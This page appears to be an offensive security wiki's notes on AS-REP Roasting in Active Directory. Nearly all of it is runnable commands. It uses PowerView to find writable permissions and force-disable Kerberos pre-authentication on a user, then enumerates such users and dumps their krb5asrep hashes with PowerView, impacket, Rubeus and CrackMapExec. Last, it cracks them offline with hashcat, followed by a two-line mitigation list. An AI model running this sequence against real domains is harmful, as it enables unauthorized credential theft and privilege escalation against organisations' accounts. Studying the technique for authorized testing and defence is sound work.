---
title: "AS-REP Roasting"
description: "Privilege escalation using AS-REP Roasting."
lead: "Using AS-REP Roasting for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 10
toc: true
---

## Overview

- Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication
- Users do not have to be service accounts
- Must have pre-authentication disabled
- Can request any authentication data (encrypted TGT) for any user since KDC skips validation
- Crack dumped hash with hashcat

## Exploitation

### Force Disable Kerberos Preauth

```powershell
# Using PowerView 3.0/dev
# Enumerate permissions for RDPUsers on ACLS
Invoke-ACLScanner -ResolveGUIDS | ?{ $_.IdentityReferenceName -match "RDPUsers" }

# Disable preauth for user
Set-DomainObject -Identity Control572User -XOR @{useraccountcontrol=4194304} -Verbose
```

### Enumerate Users with Preauth Disabled

```powershell
# Using PowerView 3.0/dev
Get-DomainUser -PreauthNotRequired -Verbose | Select samaccountname

# Using AD Module
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth

# Query AS-REP-roastable users with impacket from Kali host
# Supply userlist and don't require authentication
GetNPUsers.py -dc-ip 10.10.149.145 -no-pass -usersfile users.txt -format hashcat -outputfile hashes.asrep spookysec.local/

# Dump KRBASREP5 hash for specific user and output in hashcat format to file
.\Rubeus.exe asreproast /user:control572user /format:hashcat /outfile:control572user.asrep

# Dump hashes with credentials using CrackMapExec
crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt

# Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
# Crack hash with hashcat
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Mitigation

- Strong password policy
- Enable Kerberos Pre-Authentication

## Further Reading

- [iRedTeam: AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [XPN: Kerberos AD Attacks - More Roasting with AS-REP](https://blog.xpnsec.com/kerberos-attacks-part-2/)
- [harmj0y: Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
